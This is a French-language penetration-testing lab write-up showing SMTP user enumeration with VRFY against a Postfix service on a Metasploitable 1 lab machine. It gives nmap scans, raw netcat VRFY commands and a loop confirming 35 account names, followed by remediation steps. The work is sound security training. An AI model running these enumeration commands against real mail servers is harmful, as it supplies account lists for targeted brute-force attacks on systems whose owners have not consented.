SMTP Postfix — Énumération d'utilisateurs via VRFY

35 comptes système confirmés par le protocole SMTP, recoupant entièrement la liste obtenue via Samba

Service / PortSMTP (Postfix) — port 25
CibleMetasploitable 1 — 192.168.56.102
CVE— (abus de fonctionnalité protocolaire, pas une CVE précise)
Résultat35 comptes confirmés, recoupement complet avec samba-enum.html
Testé parZANNOU Josaphat
Note réseau. Cette page utilise le réseau de Josaphat (vboxnet0) : cible 192.168.56.102. Côté Jules, le même service est sur 172.28.128.4.

1. Identification

$ nmap -sC -sV -p 25 192.168.56.102
25/tcp open  smtp    Postfix smtpd
| smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000,
VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN

$ nmap --script smtp-enum-users -p 25 192.168.56.102
| smtp-enum-users:
|_  Method RCPT returned a unhandled status code.

Postfix, et surtout : VRFY est annoncé dans les commandes supportées — signal direct que l'énumération d'utilisateurs est possible. La méthode par défaut du script automatisé (RCPT) échoue ; plutôt que d'abandonner, on se rabat sur le protocole SMTP brut avec la méthode réellement annoncée (VRFY).

2. Méthode manuelle (protocole SMTP brut)

$ printf 'VRFY root\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
252 2.0.0 root

$ printf 'VRFY nonexistentuser123\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
550 5.1.1 <nonexistentuser123>: Recipient address rejected: User unknown in local recipient table

252 pour un compte valide (Postfix ne confirme pas formellement comme le ferait 250 au sens strict RFC, mais 252 = "je ne peux pas vérifier mais j'accepterai le message", signal fiable), 550 pour un compte inexistant. Oracle net : on distingue un compte réel d'un compte inventé. EXPN testé par souci de complétude : non supporté (502), cohérent avec smtp-commands.

3. Démarche d'exploitation — énumération en lot

Test des 35 comptes déjà obtenus via RID cycling SMB (samba-enum.html), en boucle :

USERS=(games nobody bind proxy syslog user www-data root news postgres bin mail distccd
       proftpd dhcp daemon sshd man lp mysql gnats libuuid backup msfadmin telnetd sys klog
       postfix service list irc ftp tomcat55 sync uucp)
for u in "${USERS[@]}"; do
  resp=$(printf 'VRFY %s\r\nQUIT\r\n' "$u" | nc -w2 192.168.56.102 25)
  echo "$resp" | grep -qE "^25[02] " && echo "$u : valide"
done
echo "Comptes confirmés valides : 35 / 35"

⚠️ Piège d'outillage rencontré (pas un piège de la cible) : en zsh, for u in $USERS (variable non tableau, non quotée) ne découpe pas la chaîne en mots comme le ferait bash — toute la liste était traitée comme un seul élément. Corrigé en utilisant un vrai tableau zsh (USERS=(...) + "${USERS[@]}").

4. Preuve d'accès obtenu

Pas de shell ici (SMTP sert à énumérer, pas à exploiter directement), mais le résultat est une primitive de reconnaissance forte : une liste de 35 noms de compte système valides, confirmée par une seconde source indépendante. Dans un scénario réel, cette liste serait la base d'une attaque par force brute ciblée plutôt que de deviner des noms au hasard.

5. Remédiation

RECOMMANDATIONS
  • Désactiver VRFY dans la configuration Postfix (disable_vrfy_command = yes) — cause racine de cette énumération.
  • Limiter le débit de connexions SMTP (smtpd_client_connection_rate_limit) pour ralentir une énumération en masse.
  • Ne pas se fier au fait qu'une méthode d'énumération standard échoue pour conclure qu'un service est sûr : vérifier manuellement les méthodes réellement supportées.
